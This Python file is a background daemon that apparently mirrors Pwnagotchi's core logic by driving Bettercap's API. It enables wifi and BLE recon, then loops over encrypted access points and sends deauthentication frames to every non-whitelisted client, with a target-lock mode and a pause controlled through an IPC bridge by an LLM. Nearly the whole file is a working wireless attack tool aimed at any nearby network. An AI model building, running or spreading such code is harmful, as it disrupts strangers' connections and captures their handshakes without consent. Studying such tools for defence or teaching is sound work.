import logging
import os
import time
from threading import Thread

import requests
from requests.auth import HTTPBasicAuth

# Try to use openclawgotchi config if available, otherwise fallback to defaults
try:
    from config import BETTERCAP_PASS, BETTERCAP_URL, BETTERCAP_USER, PWN_WHITELIST_MACS
except ImportError:
    PWN_WHITELIST_MACS = []
    BETTERCAP_URL = "http://localhost:8081/api"
    BETTERCAP_USER = "gotchi"
    BETTERCAP_PASS = __import__('secrets').token_hex(16)

log = logging.getLogger("PwnSubconscious")
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")


class PwnDaemon:
    """
    The Subconscious Pwn Daemon.
    Runs a lightweight Automata state machine that completely mirrors the core hacking 
    logic of a modern Pwnagotchi.
    """
    def __init__(self):
        self.auth = HTTPBasicAuth(BETTERCAP_USER, BETTERCAP_PASS)
        self.running = False
        self.history = {}  # Tracks how many times we've interacted with a MAC
        self.max_interactions = 3  # Max deauths per target to avoid spamming
        # Load whitelist once at startup (reload via reload_whitelist())
        self._whitelist = PWN_WHITELIST_MACS[:] if PWN_WHITELIST_MACS else []

    def _request(self, method, endpoint, payload=None):
        """Wrapper for Bettercap REST API calls"""
        url = f"{BETTERCAP_URL}/{endpoint}"
        try:
            if method == "GET":
                r = requests.get(url, auth=self.auth, timeout=5)
            elif method == "POST":
                r = requests.post(url, auth=self.auth, json=payload, timeout=5)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            log.debug(f"Bettercap API Error: {e}")
            return None

    def run_cmd(self, cmd):
        """Execute a command in Bettercap"""
        log.debug(f"Bettercap CMD: {cmd}")
        return self._request("POST", "session", {"cmd": cmd})

    def get_session(self):
        """Get the current wifi session state"""
        return self._request("GET", "session")

    def _should_interact(self, mac):
        """Check if we should deauth this target (not whitelisted, not over-spammed)"""
        if mac.lower() in [w.lower() for w in self._whitelist]:
            return False
            
        if mac not in self.history:
            self.history[mac] = 1
            return True
            
        self.history[mac] += 1
        return self.history[mac] <= self.max_interactions

    def reload_whitelist(self):
        """Reload PWN_WHITELIST_MACS from .env (call sparingly — file I/O on SD)."""
        try:
            from dotenv import load_dotenv
            load_dotenv()
            import os as _os
            raw = _os.environ.get("PWN_WHITELIST_MACS", "")
            self._whitelist = [m.strip().lower() for m in raw.split(",") if m.strip()]
            log.info(f"Whitelist reloaded: {len(self._whitelist)} entries")
        except Exception as e:
            log.warning(f"Whitelist reload failed: {e}")

    def attack_loop(self):
        log.info("Subconscious Pwn Daemon Started. Initializing wlan0mon recon...")
        
        # Turn on wifi.recon and ble.recon, delay clear to preserve initial discoveries
        self.run_cmd('wifi.recon on')
        self.run_cmd('ble.recon on')
        time.sleep(3)
        self.run_cmd('wifi.clear')
        self.run_cmd('ble.clear')
        
        self.running = True
        
        while self.running:
            try:
                # -- Daemon Control Checks (Atomic IPC Bridge) --
                from utils.ipc import state_manager
                state = state_manager.get_state()
                
                # Check for pause
                if time.time() < state.get("paused_until", 0):
                    remaining = int(state["paused_until"] - time.time())
                    log.info(f"Daemon is paused by LLM. Waking up in {remaining} seconds...")
                    time.sleep(5)
                    continue
                            
                target_bssid = state.get("target_lock")
                if target_bssid:
                    log.info(f"Target Lock Active: Daemon is focused exclusively on {target_bssid}")
                        
                # 1. Fetch current environment state
                session = self.get_session()
                if not session or 'wifi' not in session or 'aps' not in session['wifi']:
                    log.warning("Bettercap not returning wifi data. Retrying in 5s...")
                    time.sleep(5)
                    continue
                
                aps = session['wifi']['aps']
                deauthed = False

                # 2. Iterate through visible access points
                for ap in aps:
                    # Skip open networks
                    if ap['encryption'] == '' or ap['encryption'] == 'OPEN':
                        continue
                        
                    # Target Lock Constraints
                    if target_bssid and target_bssid != ap['mac'].lower():
                        continue
                    
                    # 3. Find active clients (stations) on this AP
                    clients = ap.get('clients', [])
                    for client in clients:
                        client_mac = client['mac']
                        
                        # 4. Determine if we should attack
                        if self._should_interact(client_mac):
                            ap_name = ap.get('hostname', ap['mac'])
                            log.info(f"Target found: Deauthing {client_mac} from AP {ap_name} (CH: {ap['channel']})")
                            
                            # Execute Deauth
                            self.run_cmd(f"wifi.deauth {client_mac}")
                            deauthed = True
                            
                            # Wait slightly to let frames fly
                            time.sleep(1)

                # 5. Channel Hopping Logic
                if target_bssid:
                    target_ch = next((ap['channel'] for ap in aps if ap['mac'].lower() == target_bssid), None)
                    if target_ch:
                        log.info(f"Target Locked: Targeting {target_bssid} on CH {target_ch}")
                        time.sleep(2)
                        continue

                # Bettercap handles its own channel hopping via wifi.recon on.
                # Just sleep between cycles to avoid busy-waiting the Pi Zero.
                wait_time = 5 if deauthed else 2
                time.sleep(wait_time)
                
                log.info(f"Daemon cycle complete. Currently tracking {len(aps)} APs.")

            except Exception as e:
                log.error(f"Error in attack loop: {e}")
                time.sleep(5)

    def start_background(self):
        """Starts the daemon in a background thread"""
        t = Thread(target=self.attack_loop, daemon=True, name="SubconsciousPwn")
        t.start()
        return t

if __name__ == "__main__":
    # Standalone test mode
    daemon = PwnDaemon()
    daemon.attack_loop()
